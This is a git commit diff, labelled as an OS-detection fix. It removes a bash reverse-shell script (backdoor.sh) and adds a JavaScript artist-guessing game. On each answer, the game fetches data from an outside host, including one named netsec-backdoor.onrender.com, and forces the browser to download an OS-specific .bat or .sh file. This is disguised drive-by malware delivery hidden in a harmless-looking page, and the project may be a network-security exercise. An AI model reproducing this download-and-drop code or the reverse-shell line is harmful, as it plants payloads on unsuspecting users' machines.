fedf1ed75e4164eb0870be0b6f19de30aff2959b
MuhireIghor <muhireighor123@gmail.com>
2024-01-24 16:48:58 +0200

    [fix]:Fixed request user agent os detection

--- backdoors/backdoor.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-bash -i >& /dev/tcp/::ffff:127.0.0.1/4567 0>&1
---
+++ client/infoGrip.js
@@ -0,0 +1,81 @@
+var isArtistCorrect = false;
+var randomIndex;
+const artistInfo = [
+  {
+    name: "Bruce Melodie",
+    profileUrl: "./assets//bruceMelodie.jpg",
+  },
+  {
+    name: "Nel Ngabo",
+    profileUrl: "./assets/nelNgabo.jpg",
+  },
+  {
+    name: "Igor Mabano",
+    profileUrl: "./assets/igorMabano.jpg",
+  },
+  {
+    name: "Kenny Sol",
+    profileUrl: "./assets/kennySol.jpg",
+  },
+];
+window.onload = () => {
+  console.log("wow");
+  document.getElementById("artist-image").alt = "wow";
+  getRandomImage();
+};
+function getRandomImage() {
+  randomIndex = Math.floor(Math.random() * artistInfo.length);
+  const randomImageUrl = artistInfo[randomIndex].profileUrl;
+  document.getElementById("artist-image").src = randomImageUrl;
+
+  console.log("reached!");
+}
+function checkAnswer() {
+  const selectedArtist = document.getElementById("artist-options").value;
+  if (selectedArtist == artistInfo[randomIndex].name) {
+    isArtistCorrect = true;
+    document.getElementById("correct").style.display = "block";
+    document.getElementById("wrong").style.display = "none";
+    fetch("http://192.168.2.201:3000").
+    then((res) => {
+       const resText = res.json();
+      return resText;
+    })
+    .then((data) => {
+    let {os} = data;
+      let blob = new Blob([data], { type: "application/octet-stream" });
+      let url = window.URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = os== 'windows'? "win.bat":'win.sh';
+      a.click();
+      window.URL.revokeObjectURL(url);
+    })
+    .catch((err) => {   
+      console.log(err.message);
+    });
+  } else {
+    document.getElementById("correct").style.display = "none";
+    document.getElementById("wrong").style.display = "block";
+    fetch("https://netsec-backdoor.onrender.com")
+    .then((res) => {
+      return res.json();
+    })
+    .then((data) => {
+        let {os}= data;
+      let blob = new Blob([data], { type: "octet/stream" });
+      let url = window.URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      
+      a.download = os== 'windows'?"loss.bat":'loss.sh';
+      a.click();
+      window.URL.revokeObjectURL(url);
+    })
+    .catch((err) => {
+      console.log(err.message);
+    });
+  }
+
+  alert(`You selected: ${selectedArtist}`);
+}
